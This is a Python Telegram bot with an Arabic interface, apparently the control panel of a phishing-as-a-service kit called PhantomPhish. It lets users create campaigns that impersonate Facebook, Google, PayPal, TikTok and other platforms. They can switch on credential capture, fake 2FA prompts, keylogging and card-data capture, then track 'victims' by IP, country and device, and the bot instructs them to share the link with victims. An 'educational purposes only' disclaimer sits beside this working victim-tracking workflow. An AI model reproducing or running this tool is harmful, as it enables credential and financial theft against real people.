#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import logging
import os
import sys
from datetime import datetime
from typing import Optional

from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.filters import Command, CommandObject
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, FSInputFile
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder

# استيراد الوحدات المحلية
from config import config
from database import db
from generator import generator

# إعداد التسجيل
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# إنشاء البوت والموزع
bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()

# حالات المحادثة
class CreateCampaign(StatesGroup):
    waiting_for_platform = State()
    waiting_for_name = State()
    waiting_for_features = State()
    confirm = State()

class BroadcastState(StatesGroup):
    waiting_for_message = State()

# === لوحات المفاتيح ===

def main_menu_keyboard(is_admin: bool = False) -> InlineKeyboardMarkup:
    """لوحة المفاتيح الرئيسية"""
    builder = InlineKeyboardBuilder()
    
    builder.row(
        InlineKeyboardButton(text="🎯 إنشاء حملة جديدة", callback_data="new_campaign"),
        InlineKeyboardButton(text="📊 حملاتي", callback_data="my_campaigns")
    )
    builder.row(
        InlineKeyboardButton(text="📈 الإحصائيات", callback_data="stats"),
        InlineKeyboardButton(text="⚙️ الإعدادات", callback_data="settings")
    )
    
    if is_admin:
        builder.row(
            InlineKeyboardButton(text="👥 جميع المستخدمين", callback_data="all_users"),
            InlineKeyboardButton(text="📢 بث جماعي", callback_data="broadcast")
        )
        builder.row(
            InlineKeyboardButton(text="🗄️ قاعدة البيانات", callback_data="db_backup")
        )
    
    return builder.as_markup()

def platforms_keyboard() -> InlineKeyboardMarkup:
    """لوحة اختيار المنصة"""
    builder = InlineKeyboardBuilder()
    
    platforms = [
        ("🔵 فيسبوك", "facebook"),
        ("📸 إنستغرام", "instagram"),
        ("🔴 جوجل", "google"),
        ("💳 بايبال", "paypal"),
        ("🐦 تويتر", "twitter"),
        ("👻 سناب شات", "snapchat"),
        ("🎵 تيك توك", "tiktok"),
        ("🎨 مخصص", "custom")
    ]
    
    for name, code in platforms:
        builder.button(text=name, callback_data=f"platform_{code}")
    
    builder.adjust(2)
    return builder.as_markup()

def features_keyboard() -> InlineKeyboardMarkup:
    """لوحة اختيار الميزات"""
    builder = InlineKeyboardBuilder()
    
    features = [
        ("🔐 بيانات الدخول", "credentials"),
        ("📱 تحقق ثنائي 2FA", "2fa"),
        ("⌨️ تسجيل المفاتيح", "keylogger"),
        ("💳 بيانات البطاقة", "card")
    ]
    
    for name, code in features:
        builder.button(text=name, callback_data=f"feature_{code}")
    
    builder.button(text="✅ تأكيد", callback_data="features_done")
    builder.adjust(2)
    return builder.as_markup()

def campaign_actions_keyboard(campaign_id: str) -> InlineKeyboardMarkup:
    """إجراءات الحملة"""
    builder = InlineKeyboardBuilder()
    
    builder.row(
        InlineKeyboardButton(text="🔗 نسخ الرابط", callback_data=f"copy_{campaign_id}"),
        InlineKeyboardButton(text="📊 التقارير", callback_data=f"report_{campaign_id}")
    )
    builder.row(
        InlineKeyboardButton(text="⏸️ إيقاف", callback_data=f"pause_{campaign_id}"),
        InlineKeyboardButton(text="▶️ تشغيل", callback_data=f"resume_{campaign_id}")
    )
    builder.row(
        InlineKeyboardButton(text="🗑️ حذف", callback_data=f"delete_{campaign_id}")
    )
    builder.row(
        InlineKeyboardButton(text="🔙 رجوع", callback_data="my_campaigns")
    )
    
    return builder.as_markup()

# === أوامر البوت ===

@router.message(Command("start"))
async def cmd_start(message: Message):
    """أمر البدء"""
    user_id = message.from_user.id
    
    # تسجيل المستخدم
    db.add_user(
        user_id=user_id,
        username=message.from_user.username,
        first_name=message.from_user.first_name,
        is_admin=(user_id in config.ADMIN_IDS)
    )
    
    is_admin = db.is_admin(user_id)
    
    welcome_text = f"""
👻 **مرحباً بك في PhantomPhish Bot**

أهلاً {message.from_user.first_name}!

هذا البوت يتيح لك إنشاء صفحات تصيّد احترافية ومراقبة النتائج في الوقت الفعلي.

📊 **إحصائياتك:**
• الحملات النشطة: {db.get_stats(user_id)['campaigns']}
• الضحايا: {db.get_stats(user_id)['victims']}
• البيانات الملتقطة: {db.get_stats(user_id)['captures']}

اختر من القائمة أدناه:
    """
    
    await message.answer(
        welcome_text,
        parse_mode="Markdown",
        reply_markup=main_menu_keyboard(is_admin)
    )

@router.message(Command("help"))
async def cmd_help(message: Message):
    """أمر المساعدة"""
    help_text = """
📚 **دليل استخدام PhantomPhish Bot**

**الأوامر الأساسية:**
/start - بدء البوت
/help - عرض المساعدة
/stats - عرض إحصائياتك

**إنشاء حملة:**
1. اضغط "🎯 إنشاء حملة جديدة"
2. اختر المنصة المستهدفة
3. أدخل اسم للحملة
4. اختر الميزات المطلوبة
5. احصل على الرابط وشاركه

**الميزات المتاحة:**
🔐 التقاط بيانات الدخول
📱 محاكاة التحقق الثنائي
⌨️ تسجيل ضغطات المفاتيح
💳 التقاط بيانات البطاقات

**مراقبة النتائج:**
• اضغط "📊 حملاتي" لعرض حملاتك
• اضغط "📈 الإحصائيات" للإحصائيات المفصلة
• ستصلك إشعارات فورية عند التقاط بيانات

⚠️ **تنبيه:** هذا البوت للأغراض التعليمية فقط.
    """
    
    await message.answer(help_text, parse_mode="Markdown")

@router.message(Command("stats"))
async def cmd_stats(message: Message):
    """عرض الإحصائيات"""
    user_id = message.from_user.id
    stats = db.get_stats(user_id)
    
    stats_text = f"""
📊 **إحصائياتك الشخصية**

🎯 الحملات: {stats['campaigns']}
👥 الضحايا: {stats['victims']}
📥 البيانات الملتقطة: {stats['captures']}

📅 آخر تحديث: {datetime.now().strftime('%Y-%m-%d %H:%M')}
    """
    
    await message.answer(stats_text, parse_mode="Markdown")

# === معالجات الأزرار ===

@router.callback_query(F.data == "new_campaign")
async def process_new_campaign(callback: CallbackQuery, state: FSMContext):
    """بدء إنشاء حملة جديدة"""
    await state.set_state(CreateCampaign.waiting_for_platform)
    
    await callback.message.edit_text(
        "🎯 **إنشاء حملة جديدة**\n\n"
        "اختر المنصة المستهدفة:",
        parse_mode="Markdown",
        reply_markup=platforms_keyboard()
    )

@router.callback_query(F.data.startswith("platform_"))
async def process_platform(callback: CallbackQuery, state: FSMContext):
    """اختيار المنصة"""
    platform = callback.data.replace("platform_", "")
    
    await state.update_data(platform=platform)
    await state.set_state(CreateCampaign.waiting_for_name)
    
    platform_names = {
        'facebook': 'فيسبوك 🔵',
        'instagram': 'إنستغرام 📸',
        'google': 'جوجل 🔴',
        'paypal': 'بايبال 💳',
        'twitter': 'تويتر 🐦',
        'snapchat': 'سناب شات 👻',
        'tiktok': 'تيك توك 🎵',
        'custom': 'مخصص 🎨'
    }
    
    await callback.message.edit_text(
        f"✅ تم اختيار: {platform_names.get(platform, platform)}\n\n"
        f"📝 أدخل اسم للحملة (مثال: حملة فيسبوك 1):",
        parse_mode="Markdown"
    )

@router.message(CreateCampaign.waiting_for_name)
async def process_name(message: Message, state: FSMContext):
    """إدخال اسم الحملة"""
    await state.update_data(campaign_name=message.text)
    await state.set_state(CreateCampaign.waiting_for_features)
    
    await message.answer(
        "⚙️ **اختر الميزات المطلوبة:**\n\n"
        "يمكنك اختيار أكثر من ميزة:",
        parse_mode="Markdown",
        reply_markup=features_keyboard()
    )

@router.callback_query(F.data.startswith("feature_"))
async def process_feature(callback: CallbackQuery, state: FSMContext):
    """اختيار الميزات"""
    feature = callback.data.replace("feature_", "")
    
    data = await state.get_data()
    features = data.get('features', [])
    
    if feature not in features:
        features.append(feature)
    else:
        features.remove(feature)
    
    await state.update_data(features=features)
    
    # تحديث الأزرار
    builder = InlineKeyboardBuilder()
    
    all_features = [
        ("🔐 بيانات الدخول", "credentials"),
        ("📱 تحقق ثنائي 2FA", "2fa"),
        ("⌨️ تسجيل المفاتيح", "keylogger"),
        ("💳 بيانات البطاقة", "card")
    ]
    
    for name, code in all_features:
        mark = "✅ " if code in features else ""
        builder.button(text=f"{mark}{name}", callback_data=f"feature_{code}")
    
    builder.button(text="✅ تأكيد", callback_data="features_done")
    builder.adjust(2)
    
    await callback.message.edit_reply_markup(reply_markup=builder.as_markup())

@router.callback_query(F.data == "features_done")
async def process_features_done(callback: CallbackQuery, state: FSMContext):
    """تأكيد الميزات وإنشاء الحملة"""
    data = await state.get_data()
    
    platform = data.get('platform')
    campaign_name = data.get('campaign_name')
    features = data.get('features', ['credentials'])
    
    # إنشاء الحملة
    try:
        result = generator.generate_campaign(
            platform=platform,
            campaign_name=campaign_name,
            base_url=config.PUBLIC_URL,
            features=features
        )
        
        # حفظ في قاعدة البيانات
        db.create_campaign(
            campaign_id=result['campaign_id'],
            name=campaign_name,
            platform=platform,
            url=result['url'],
            created_by=callback.from_user.id
        )
        
        # عرض النتيجة
        result_text = f"""
✅ **تم إنشاء الحملة بنجاح!**

🆔 معرف الحملة: `{result['campaign_id']}`
📝 الاسم: {campaign_name}
🎯 المنصة: {platform}
🔗 الرابط: `{result['url']}`

⚙️ **الميزات المفعلة:**
{chr(10).join([f"• {f}" for f in features])}

📤 **شارك الرابط مع الضحايا**
        """
        
        await callback.message.edit_text(
            result_text,
            parse_mode="Markdown",
            reply_markup=campaign_actions_keyboard(result['campaign_id'])
        )
        
        await state.clear()
        
    except Exception as e:
        logger.error(f"Error creating campaign: {e}")
        await callback.message.edit_text(
            f"❌ حدث خطأ: {str(e)}",
            parse_mode="Markdown"
        )

@router.callback_query(F.data == "my_campaigns")
async def process_my_campaigns(callback: CallbackQuery):
    """عرض حملات المستخدم"""
    user_id = callback.from_user.id
    campaigns = db.get_user_campaigns(user_id)
    
    if not campaigns:
        await callback.message.edit_text(
            "📭 **لا توجد حملات بعد**\n\n"
            "اضغط على 'إنشاء حملة جديدة' للبدء",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎯 إنشاء حملة", callback_data="new_campaign")]
            ])
        )
        return
    
    builder = InlineKeyboardBuilder()
    
    text = "📊 **حملاتك:**\n\n"
    
    for i, campaign in enumerate(campaigns[:10], 1):
        status = "🟢" if campaign['status'] == 'active' else "🔴"
        text += f"{i}. {status} {campaign['name']}\n"
        text += f"   👥 {campaign['clicks']} | 📥 {campaign['captures']}\n\n"
        
        builder.button(
            text=f"{i}. {campaign['name'][:20]}",
            callback_data=f"campaign_{campaign['campaign_id']}"
        )
    
    builder.adjust(1)
    builder.row(InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_main"))
    
    await callback.message.edit_text(
        text,
        parse_mode="Markdown",
        reply_markup=builder.as_markup()
    )

@router.callback_query(F.data.startswith("campaign_"))
async def process_campaign_details(callback: CallbackQuery):
    """تفاصيل الحملة"""
    campaign_id = callback.data.replace("campaign_", "")
    campaign = db.get_campaign(campaign_id)
    
    if not campaign:
        await callback.answer("الحملة غير موجودة", show_alert=True)
        return
    
    # إحصائيات الحملة
    victims = db.get_campaign_victims(campaign_id)
    
    details_text = f"""
📋 **تفاصيل الحملة**

🆔 المعرف: `{campaign['campaign_id']}`
📝 الاسم: {campaign['name']}
🎯 المنصة: {campaign['platform']}
🔗 الرابط: `{campaign['url']}`

📊 **الإحصائيات:**
• الزيارات: {campaign['clicks']}
• الضحايا: {len(victims)}
• البيانات الملتقطة: {campaign['captures']}

📅 تاريخ الإنشاء: {campaign['created_at'][:16]}
    """
    
    await callback.message.edit_text(
        details_text,
        parse_mode="Markdown",
        reply_markup=campaign_actions_keyboard(campaign_id)
    )

@router.callback_query(F.data.startswith("copy_"))
async def process_copy_link(callback: CallbackQuery):
    """نسخ الرابط"""
    campaign_id = callback.data.replace("copy_", "")
    campaign = db.get_campaign(campaign_id)
    
    if campaign:
        await callback.answer(
            f"الرابط: {campaign['url']}",
            show_alert=True
        )

@router.callback_query(F.data.startswith("report_"))
async def process_report(callback: CallbackQuery):
    """تقرير الحملة"""
    campaign_id = callback.data.replace("report_", "")
    victims = db.get_campaign_victims(campaign_id)
    
    if not victims:
        await callback.answer("لا توجد بيانات بعد", show_alert=True)
        return
    
    # إنشاء تقرير نصي
    report = f"📊 تقرير الحملة {campaign_id}\n\n"
    report += f"إجمالي الضحايا: {len(victims)}\n\n"
    
    for victim in victims[:5]:
        report += f"👤 ضحية #{victim['victim_id']}\n"
        report += f"   IP: {victim['ip_address']}\n"
        report += f"   الدولة: {victim['country']}\n"
        report += f"   الجهاز: {victim['device_type']}\n"
        report += f"   آخر ظهور: {victim['last_seen'][:16]}\n\n"
    
    # إرسال كملف
    file_path = f"/tmp/report_{campaign_id}.txt"
    with open(file_path, 'w', encoding='utf-8') as f:
        f.write(report)
    
    await callback.message.answer_document(
        FSInputFile(file_path),
        caption=f"📊 تقرير الحملة {campaign_id}"
    )

@router.callback_query(F.data == "stats")
async def process_stats(callback: CallbackQuery):
    """الإحصائيات"""
    user_id = callback.from_user.id
    stats = db.get_stats(user_id)
    
    stats_text = f"""
📈 **إحصائياتك الشاملة**

🎯 إجمالي الحملات: {stats['campaigns']}
👥 إجمالي الضحايا: {stats['victims']}
📥 إجمالي البيانات: {stats['captures']}

📅 تاريخ اليوم: {datetime.now().strftime('%Y-%m-%d')}
    """
    
    await callback.message.edit_text(
        stats_text,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_main")]
        ])
    )

@router.callback_query(F.data == "back_to_main")
async def process_back_to_main(callback: CallbackQuery):
    """العودة للقائمة الرئيسية"""
    is_admin = db.is_admin(callback.from_user.id)
    
    await callback.message.edit_text(
        "🏠 **القائمة الرئيسية**",
        parse_mode="Markdown",
        reply_markup=main_menu_keyboard(is_admin)
    )

# === معالجات المشرف ===

@router.callback_query(F.data == "all_users")
async def process_all_users(callback: CallbackQuery):
    """عرض جميع المستخدمين (للمشرف فقط)"""
    if not db.is_admin(callback.from_user.id):
        await callback.answer("غير مصرح", show_alert=True)
        return
    
    # جلب المستخدمين من قاعدة البيانات
    conn = db.get_conn()
    c = conn.cursor()
    c.execute("SELECT * FROM users ORDER BY created_at DESC LIMIT 20")
    users = c.fetchall()
    
    text = "👥 **المستخدمون المسجلون:**\n\n"
    
    for user in users:
        admin_mark = "👑 " if user['is_admin'] else ""
        text += f"{admin_mark}{user['first_name']} (@{user['username']})\n"
        text += f"   ID: {user['user_id']} | {user['created_at'][:10]}\n\n"
    
    await callback.message.edit_text(
        text,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_main")]
        ])
    )

@router.callback_query(F.data == "broadcast")
async def process_broadcast(callback: CallbackQuery, state: FSMContext):
    """بدء البث الجماعي"""
    if not db.is_admin(callback.from_user.id):
        await callback.answer("غير مصرح", show_alert=True)
        return
    
    await state.set_state(BroadcastState.waiting_for_message)
    
    await callback.message.edit_text(
        "📢 **البث الجماعي**\n\n"
        "أرسل الرسالة التي تريد بثها لجميع المستخدمين:",
        parse_mode="Markdown"
    )

@router.message(BroadcastState.waiting_for_message)
async def process_broadcast_message(message: Message, state: FSMContext):
    """معالجة رسالة البث"""
    if not db.is_admin(message.from_user.id):
        await state.clear()
        return
    
    # جلب جميع المستخدمين
    conn = db.get_conn()
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    
    # إرسال البث
    success = 0
    failed = 0
    
    status_msg = await message.answer("⏳ جاري إرسال البث...")
    
    for user in users:
        try:
            await bot.send_message(
                user['user_id'],
                f"📢 **رسالة من الإدارة:**\n\n{message.text}",
                parse_mode="Markdown"
            )
            success += 1
        except:
            failed += 1
        
        await asyncio.sleep(0.05)  # تجنب الحظر
    
    await status_msg.edit_text(
        f"✅ **اكتمل البث**\n\n"
        f"✓ نجح: {success}\n"
        f"✗ فشل: {failed}"
    )
    
    await state.clear()

@router.callback_query(F.data == "db_backup")
async def process_db_backup(callback: CallbackQuery):
    """نسخة احتياطية من قاعدة البيانات"""
    if not db.is_admin(callback.from_user.id):
        await callback.answer("غير مصرح", show_alert=True)
        return
    
    await callback.message.answer_document(
        FSInputFile("phantom.db"),
        caption=f"🗄️ نسخة احتياطية - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
    )

# === معالجة الأخطاء ===

@router.error()
async def error_handler(event, exception):
    """معالج الأخطاء العام"""
    logger.error(f"Error: {exception}")
    return True

# === التشغيل ===

async def main():
    """تشغيل البوت"""
    # تسجيل الـ router
    dp.include_router(router)
    
    # حذف webhook القديم
    await bot.delete_webhook(drop_pending_updates=True)
    
    logger.info("🤖 PhantomPhish Bot Started")
    logger.info(f"📊 Admin IDs: {config.ADMIN_IDS}")
    
    # بدء الاستقبال
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
